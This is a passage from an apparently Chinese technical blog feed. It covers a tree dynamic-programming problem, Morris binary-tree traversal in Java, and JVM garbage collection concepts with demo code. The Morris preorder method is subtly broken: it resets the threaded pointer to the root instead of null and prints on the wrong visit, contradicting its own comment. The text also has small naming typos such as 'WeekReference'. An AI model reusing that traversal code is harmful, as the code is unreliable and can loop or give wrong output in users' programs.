employee)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (employee.subordinates.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnTypeByMaxHappy</span>(employee.happy, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果当前节点来 返回值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">lai</span> <span class="operator">=</span> employee.happy;</span><br><span class="line">        <span class="comment">//不来</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bu</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Employee subordinate : employee.subordinates) &#123;</span><br><span class="line">            <span class="type">ReturnTypeByMaxHappy</span> <span class="variable">ret</span> <span class="operator">=</span> MaxHappy(subordinate);</span><br><span class="line">            <span class="comment">//如果我来  底下人不能来</span></span><br><span class="line">            lai += ret.buMaxHappy;</span><br><span class="line">            <span class="comment">//如果我不来  底下人可以来可以不来  取最大值</span></span><br><span class="line">            bu += Math.max(ret.laiMaxHappy, ret.buMaxHappy);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReturnTypeByMaxHappy</span>(lai,bu);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReturnTypeByMaxHappy</span>&#123;</span><br><span class="line">        <span class="type">int</span> laiMaxHappy;</span><br><span class="line">        <span class="type">int</span> buMaxHappy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ReturnTypeByMaxHappy</span><span class="params">(<span class="type">int</span> laiMaxHappy, <span class="type">int</span> buMaxHappy)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.laiMaxHappy = laiMaxHappy;</span><br><span class="line">            <span class="built_in">this</span>.buMaxHappy = buMaxHappy;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>&#123;</span><br><span class="line">    <span class="type">int</span> happy;  <span class="comment">//该员工的快乐值</span></span><br><span class="line">    List&lt;Employee&gt; subordinates;  <span class="comment">//直接下级</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(<span class="type">int</span> happy, List&lt;Employee&gt; subordinates)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.happy = happy;</span><br><span class="line">        <span class="built_in">this</span>.subordinates = subordinates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="lhcRd"></a></p><h1 id="树结构Morris遍历"><a href="#树结构Morris遍历" class="headerlink" title="树结构Morris遍历"></a>树结构Morris遍历</h1><p><a name="TbFyW"></a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2></li></ol><p><strong>我们能不能做到遍历整棵树，时间复杂度为o(n)，空间复杂度为o(1),利用原树种大量空闲指针</strong><br /><strong>很多关于树结构的题，以morris为基础求出最优解。（笔试还是用正常的遍历就好，错误率低）</strong><br /><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hd7yc2vwj30st0iitbo.jpg" alt="image-20221125143908385"></p><ol><li><p><strong>利用morris进行遍历树结构</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Morris先序遍历</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Morris_F</span><span class="params">(tree node)</span> &#123;</span><br><span class="line">        <span class="type">tree</span> <span class="variable">cur</span> <span class="operator">=</span> node;</span><br><span class="line">        <span class="type">tree</span> <span class="variable">mostRight</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur !=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                mostRight = cur.left;</span><br><span class="line">                <span class="keyword">while</span> (mostRight.right!=<span class="literal">null</span>&amp;&amp;mostRight.right!=cur) &#123;</span><br><span class="line">                    mostRight = mostRight.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mostRight.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                    mostRight.right = cur;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//这里说明是遍历到cur第一次</span></span><br><span class="line">                    System.out.println(cur.value);</span><br><span class="line">                    mostRight.right = node;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//这里说明是最底层节点  没有左节点 在右转前输出一次</span></span><br><span class="line">                System.out.println(cur.value);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Morris中序遍历</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Morris_M</span><span class="params">(tree node)</span> &#123;</span><br><span class="line">        <span class="type">tree</span> <span class="variable">cur</span> <span class="operator">=</span> node;</span><br><span class="line">        <span class="type">tree</span> <span class="variable">mostRight</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur.left!=<span class="literal">null</span>) &#123;</span><br><span class="line">                 mostRight = cur.left;</span><br><span class="line">                 <span class="keyword">while</span> (mostRight.right!=<span class="literal">null</span>&amp;&amp;mostRight.right!=cur) &#123;</span><br><span class="line">                     mostRight = mostRight.right;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span> (mostRight.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                     mostRight.right = cur;</span><br><span class="line">                     cur = cur.left;</span><br><span class="line">                     <span class="keyword">continue</span>;</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     mostRight.right = <span class="literal">null</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(cur.value);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a name="zwEgb"></a></p><h1 id="dp套路与Morris套路什么时候使用"><a href="#dp套路与Morris套路什么时候使用" class="headerlink" title="dp套路与Morris套路什么时候使用"></a>dp套路与Morris套路什么时候使用</h1></li><li><p><strong>当我们的方法必须做第三次信息的强整合，也就是说我最后的决策必须依赖于左右两边的信息，我们使用dp套路，因为Morris每个点只返回两次。</strong></p></li><li><p><strong>如果不需要则就可以使用Morris。</strong></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>垃圾回收与内存分配</title>
      <link href="/2022/11/25/JVM/3_%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E4%B8%8E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5/"/>
      <url>/2022/11/25/JVM/3_%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E4%B8%8E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="垃圾收集器与内存分配策略"><a href="#垃圾收集器与内存分配策略" class="headerlink" title="垃圾收集器与内存分配策略"></a>垃圾收集器与内存分配策略</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>我们先提出三个问题：</p><blockquote><p>哪部分内存需要回收?</p><p>什么时候进行回收？</p><p>如何进行回收？</p></blockquote><h2 id="生存还是死亡？"><a href="#生存还是死亡？" class="headerlink" title="生存还是死亡？"></a>生存还是死亡？</h2><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>​    我们都知道在Java中，栈，本地方法区，程序计数器都是线程私有的，随着线程的创建和结束，内存也会自动的分配和销毁，执行的方法也随着栈帧的插入和弹出而创建和销毁。所以这部分区域我们不必担心。</p><p>​    而方法区（元空间）和堆空间，是线程共享的，这部分区域的内存就是我们需要去进行垃圾回收的区域。</p><h3 id="when"><a href="#when" class="headerlink" title="when"></a>when</h3><p>​    什么时候进行垃圾回收，就需要我们判断这个对象是否仍被引用，如果没有一个指针指向它，那我们就可以放心的进行垃圾回收，如果仍被引用，那就不行（你杀根本干嘛，这人我正用着呢），关于对象引用判断分为两种：</p><h4 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h4><p>​    就是说一个人引用，就对一个引用计数器加一，如果这个人不引用了，我们就减一，当引用计数器等于0的时候，我们就可以判定，可以被垃圾清理了。</p><blockquote><p>该方法易理解，且实现简单。但一个缺点就是遇到循环依赖，不好处理。在主流的java虚拟机中都没有使用该方法进行判断。下面用代码进行说明。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">referenceCountingGC</span> &#123;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 这里创建一个字节数组只是为了，占一些内存，方便后面看GC情况。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">_1mb</span> <span class="operator">=</span> <span class="number">1024</span>*<span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">byte</span>[] bigSize = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2</span>*_1mb];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * -XX:+PrintGCDetails </span></span><br><span class="line"><span class="comment">   * 输出GC详情</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">referenceCountingGC</span> <span class="variable">A</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">referenceCountingGC</span>();</span><br><span class="line">    <span class="type">referenceCountingGC</span> <span class="variable">B</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">referenceCountingGC</span>();</span><br><span class="line">    A.instance = B;</span><br><span class="line">    B.instance = A;</span><br><span class="line"></span><br><span class="line">    A=<span class="literal">null</span>;</span><br><span class="line">    B=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * [Full GC (System.gc()) </span></span><br><span class="line"><span class="comment">     * [PSYoungGen: 496K-&gt;0K(38400K)]</span></span><br><span class="line"><span class="comment">     * [ParOldGen: 8K-&gt;424K(87552K)]</span></span><br><span class="line"><span class="comment">     * 504K-&gt;424K(125952K</span></span><br><span class="line"><span class="comment">     * ), [Metaspace: 3208K-&gt;3208K(1056768K)],</span></span><br><span class="line"><span class="comment">     * 0.0135739 secs] [Times: user=0.01 sys=0.00, real=0.01 secs] </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 我们看到即使两个对象相互引用，但JVM还是进行回收了，侧面反映出JVM没有使用</span></span><br><span class="line"><span class="comment">     * 引用技术法来判断对象是否存活</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    System.gc();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="可达性分析法"><a href="#可达性分析法" class="headerlink" title="可达性分析法"></a>可达性分析法</h4><p>​    简单来说我们将对象之间相互的引用想象成一个树结构，其中根对象为<code>GC roots</code>(有一系列的根对象)，树结构中节点与节点之间形成链，当我们寻找一个对象时，从GC roots往下走，该路径为<code>引用链</code>,如果一个对象无法在引用链中找到，就是不可达的，我们就对可以进行垃圾回收。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefu2sk4j313s0skjuh.jpg" alt="image-20220623095217493"></p><p>​        这里我们可以看到虽然object5,object6,object7之间相互引用，但是在引用链外，所以也是要判定为需要垃圾回收的。</p><blockquote><p>有哪些可以对象可作为GC roots呢？</p></blockquote><ol><li>在虚拟机栈（局部变量表）中引用的对象，也就是当前方法正在使用的参数，局部变量，临时变量。</li><li>方法区中静态属性引用对象。（类的引用型静态变量）</li><li>方法区中常量引用对象。譬如字符串常量池中引用的对象。</li><li>本地方法栈中JNI（Native方法）引用对象</li><li>Java虚拟机内部引用对象，如基本数据类型对应的Class对象，一些异常对象，类加载器对象。</li><li>被同步锁持有的对象</li><li>反映Java虚拟机内部情况的JMXBean，JVMTI中注册的回调，本地代码缓存。</li></ol><p>除了上述固定的GC Roots集合外，根据用户所选的<code>垃圾回收器</code>以及<code>当前回收的内容区域</code>不同，还有其他对象<code>临时</code>加入，共同构建GC Roots集合。比如：分代收集，局部回收。</p><h4 id="再谈引用"><a href="#再谈引用" class="headerlink" title="再谈引用"></a>再谈引用</h4><p>​    最初在JKD1.2版本之前，引用的概念就是<code>引用与非引用</code>，但现在我们希望能够再细分一些，比如一些对象我们希望在内存足够时，你就继续待着，如果内存不够了，那我们就清理掉(这么看与裁员是一样的)。很多系统的缓存功能都符合这样的应用场景。</p><p>​    在JDK1.2后，Java对引用的概念进行扩充，分为<code>强引用，软引用，弱引用，虚引用</code></p><ul><li>强引用就是最原始的概念<code>Object o1 = new Object()</code>,只要强引用关系还在，就不会清除</li><li>软引用是指一些有用，但非必要的对象，在系统放生内存溢出前，将这些对象放入回收范围之中，进行第二次的回收，如果这次回收没有足够的内存，就会抛出内存溢出异常，java中使用<code>SoftReference类</code>实现软引用。</li><li>弱引用指分必要对象，只会撑到下次垃圾回收之前，无论内存够不够，都会清理，java中使用<code>WeekReference类</code>实现</li><li>虚拟用（幽灵引)一个对象有没有虚引用都不影响是否被清理，它的作用是指当清理时，系统收到一个通知。java中使用<code>PhantomReference类</code>实现</li></ul><h3 id="how"><a href="#how" class="headerlink" title="how"></a>how</h3><p>​    当进行可达性分析后，一个对象被判定为不可达，也不是非死不可，第一次判断完后，该对象被一次标记，现在可以算的上<code>缓期</code>，随后再进行一次筛选，<strong>判断此对象是否有必要执行finalize()方法？</strong></p><blockquote><p>如果对象没有覆盖finalize()方法，或者finalize()方法已经被执行了，就判定为<code>没必要执行</code></p></blockquote><p>​    如果该对象被判定为有必要执行执行finalize()方法，对象会被放到<code>F-Queue</code>的队列中，随后一条由虚拟机创建的，低调低优先级的Finalizer线程会去执行他们的finalize()方法，这里的执行时指启动finalize()方法，并不一定等待到运行结束，因为如果finalize()执行缓慢，甚至发生死循环，则其他对象无法被删除，可能导致内存回收子系统的崩溃，finalize()是最后一次救自己的机会，随后还会有第二次标记，只要在这之前，将自己与引用链上重新关联，那再第二次标记时就会踢出<code>即将回收的队列</code>，如果这个时候还没逃走，那就得被清理了。下面用代码演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalizeEscapeGC</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> FinalizeEscapeGC SAVE_HOOK=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">isAlive</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;yes i am still alive&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">        System.out.println(<span class="string">&quot;finalize method executed !&quot;</span> );</span><br><span class="line">        <span class="comment">//进行自救</span></span><br><span class="line">        FinalizeEscapeGC.SAVE_HOOK = <span class="built_in">this</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行自救：&quot;</span>+FinalizeEscapeGC.SAVE_HOOK.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">FinalizeEscapeGC</span> <span class="variable">escapeGC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FinalizeEscapeGC</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;创建的对象：&quot;</span>+escapeGC.hashCode());</span><br><span class="line">        escapeGC = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//第一次成功救出自己</span></span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">//因为  Finalizer方法优先级低，我们等一下</span></span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">if</span> (FinalizeEscapeGC.SAVE_HOOK != <span class="literal">null</span>) &#123;</span><br><span class="line">            FinalizeEscapeGC.SAVE_HOOK.isAlive();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;i am dead&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下面代码和上面一样</span></span><br><span class="line">        FinalizeEscapeGC.SAVE_HOOK = <span class="literal">null</span>;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="comment">//因为  Finalizer方法优先级低，我们等一下</span></span><br><span class="line">        Thread.sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">if</span> (FinalizeEscapeGC.SAVE_HOOK != <span class="literal">null</span>) &#123;</span><br><span class="line">            FinalizeEscapeGC.SAVE_HOOK.isAlive();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;i am dead&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    运行后我们发现第一次gc后，该对象还存活，因为第一次执行了finalize()方法时，我们将对象本身赋值给了类变量，但是当第二次gc时，对象就彻底清除了，因为finalize()只执行一次。</p><blockquote><p>最后声明一点，不要使用finalize()来拯救对象，官网也不推荐，只是在这里让大家知道它是干嘛的就行了。</p></blockquote><h3 id="回收方法区"><a href="#回收方法区" class="headerlink" title="回收方法区"></a>回收方法区</h3><p>​    在《Java虚拟机规范》中并未要求堆方法区实现垃圾回收，所以有的虚拟机版本确实没有回收方法区，而且方法区回收也是比较苛刻的。</p><p>​    方法区垃圾回收主要回收两类：废弃的常量，类型信息。</p><blockquote><p>常量的垃圾回收和上面的类似，主要判断一个类型是否不再被使用比较苛刻，需要满足下面三点：</p></blockquote><ol><li>该类所有实例，包括派生子类的实例都已经被回收。</li><li>加载该类的类加载被回收了。</li><li>该类对应的java.lang.Class对象没有被任何引用。</li></ol><blockquote><p>满组上面三点，也不一定被回收，下面介绍一些相关虚拟机参数：</p></blockquote><ol><li>-Xnoclassgc 控制是否对类型回收。</li><li>-verbose:class -XX:+TraceClassLoading查看类加载和卸载信息(需要Product版虚拟机)</li><li>-XX:+TraceClassUnLoading(需要FastDebug版虚拟机)</li></ol><blockquote><p>什么时候需要回收方法区？</p></blockquote><p>​    在大量使用反射，动态代理，CGLib等字节码框架，会动态创建很多类，通常都需要Java虚拟机具有类型卸载的能力。保证不会堆方法区有太大的压力</p><hr><h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><p>​    在上面我们已经知道判定一个对象是否会被回收可通过<code>引用计数式</code>和<code>追踪式(可达性分析)</code>两种算法，而引用计数式在主流的垃圾回收策略中都没使用，所以我们下面讨论的还是追踪式算法。</p><blockquote><p>第一个问题：我们每次都是直接对整个堆进行可达性分析和垃圾回收吗？</p></blockquote><p>​    不可行，这会导致消耗大量的时间。大多数的垃圾回收都遵从“分代收集”的理论进行设计，而它是建立在两个分代假说上的。</p><p>​    &gt; 若分代假说：绝大多数对象都是朝生夕死的</p><p>​    &gt; 强分代假说：熬过越多次垃圾回收的对象，越难以消亡</p><p>​    这两个分代假说共同奠基了一个设计原则：收集器应该将Java堆划分出不同的区域。通俗的讲我们把<code>新生对象</code>放在一起，把<code>老不死的(戏称)</code>放在一起，通过回收对象的年龄（熬过的回收次数）放在不同的区域，每次只针对<code>新生代</code>进行垃圾回收，<code>老年代</code>偶尔进行一次回收。针对不同的区域收集，也就有了<code>Minor GC ,Major GC ,Full GC</code>回收类型的划分。</p><p>​    在划分区域后，根据不同区域以及区域内元素的特点，我们使用不同的<code>垃圾收集算法</code>，且他们都是基于分代收集理论。后面我们会详细说明。</p><p>​    &gt; 标记-清除算法</p><p>​    &gt; 标记-复制算法</p><p>​    &gt; 标记-整理算法</p><blockquote><p>第二个问题：对象不是孤立存在的，如果对象之间存在跨代引用怎么办？</p></blockquote><p>​    当我们针对新生代垃圾回收时，因为存在跨代引用，我们还得遍历老年代保证可达性分析结果的正确。这肯定也会对内存回收带来负荷，为了解决这个问题，我们对分代收集理论添加第三条经验法则：</p><p>​    &gt; 跨代引用假说：跨代引用相比同代引用要少的多。</p><p>​    其实根据前面法则，我们也能知道如果针对存在跨代引用，那么新生代的对象在经历过多轮垃圾回收后，也会被放到老年代的，这样问题就解决了，<strong>但在之此前我们怎么减少对老年代分析的性能消耗？</strong>，我们可以依据跨代引用假说，我们就可以不用对整个老年代进行扫描，只需要在新生代上建立一个全局的数据结构(记忆集，Remembered Set)，这个结构把老年代划分成若干个小块儿，标识出老年代的哪一块儿内存存在跨代引用，这样每次对新生代垃圾回收时，只用把老年代这片内存的对象加入到GC Roots即可。虽然在对象改变关系时维护数据的准确性，但比起扫描整个老年区还是划算的。</p><blockquote><p>这里我们需要确定一些回收类型的概念</p><blockquote><p>部分收集（Partial GC）：目标不是完整的收集整个Java堆，其中又细分为：</p><blockquote><p>新生代收集(Minor GC)：只收集新生代</p><p>老年代收集(Major GC)：只收集老年代，只有CMS收集器有单独收集老年代的行为(这里有一些概念上的混淆，有人会把Major GC 和 Full GC混淆，需要我们自己判断说的到底是哪个)</p><p>混合收集(Mixed GC)：收集新生代和部分老年代，目前只有G1收集器有</p></blockquote><p>整堆收集（Full GC）：收集整个堆区域和方法区</p></blockquote></blockquote><h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>​    这是一个最早期最基础的算法，也就是我们先标记哪些对象需要清除，然后再统一进行清理，当然我们也可以只标记哪些需要保留，将没有标记的进行统一的清理，但是这个算法存在两个问题：</p><ol><li>执行效率不稳定：如果有大量对象需要清理或者大量对象需要留下，那我们在标记和清除上花的时间就越多。</li><li>内存空间碎片化问题，也就是说在我们标记，清除后会产生大量不连续的内存碎片，当后面再分配大对象时，无法分配到空间，而再进行一次GC。</li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefugyq0j30t00ig75n.jpg" alt="image-20220624100645632"></p><h3 id="标记-复制算法"><a href="#标记-复制算法" class="headerlink" title="标记-复制算法"></a>标记-复制算法</h3><p>​    也被称为复制算法，最初理论为内存按照容量分成1:1两块，每次只使用一块儿，当一块儿不够用时，在分析后，将保留的对象标记并复制到另一半区域，移动堆顶指针，按照顺存放，然后直接清除之前的区域。这样就不用担心空间零散的碎片。不过<strong>缺点也很明显</strong>，你直接分一半，也太浪费空间了，导致频繁的标记复制。<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hefux99ij30gr0a874p.jpg" alt="image-20220624122757393"></p><p>​    后面又进行了一次优化：<code>Appel式回收</code>，新生代分为一个较大的<code>Eden区域</code>，和两个较小的<code>Survivor区</code>,默认比例为8:1:1,也就是每次我们只使用Eden区和一个Survivor区，当垃圾回收时，将保留的对象都放在另一个Survivor区域，然后直接堆之前的区域清理。</p><blockquote><p>第三个问题：那假如这次清理完，发现有大量的对象需要保存，但是一个Survivor区不够，怎么办？</p></blockquote><p>​    这里就设计了一个安全设计，当一个Survivor区不够，就需要使用老年代来做分配担保，将这些对象（超出的部分）直接交给老年代。不过我们最好还是用代码测试一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] a1;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] a2;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] a3;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * -XX:NewSize=10485760—新生代大小为10m</span></span><br><span class="line"><span class="comment">     * -XX:MaxNewSize=10485760—新生代最大大小为10m</span></span><br><span class="line"><span class="comment">     * -Xms20M—初始堆大小为20m</span></span><br><span class="line"><span class="comment">     * -Xmx20M—最大堆大小为20m</span></span><br><span class="line"><span class="comment">     * -XX:+UseParNewGC：新生代使用ParNewGC垃圾回收器</span></span><br><span class="line"><span class="comment">     * -XX:+UseConcMarkSweepGC---老年代使用CMS</span></span><br><span class="line"><span class="comment">     * -XX:+PrintGCDetails---打印GC详细日志</span></span><br><span class="line"><span class="comment">     * -XX:+PrintGCTimeStamps—打印GC时间</span></span><br><span 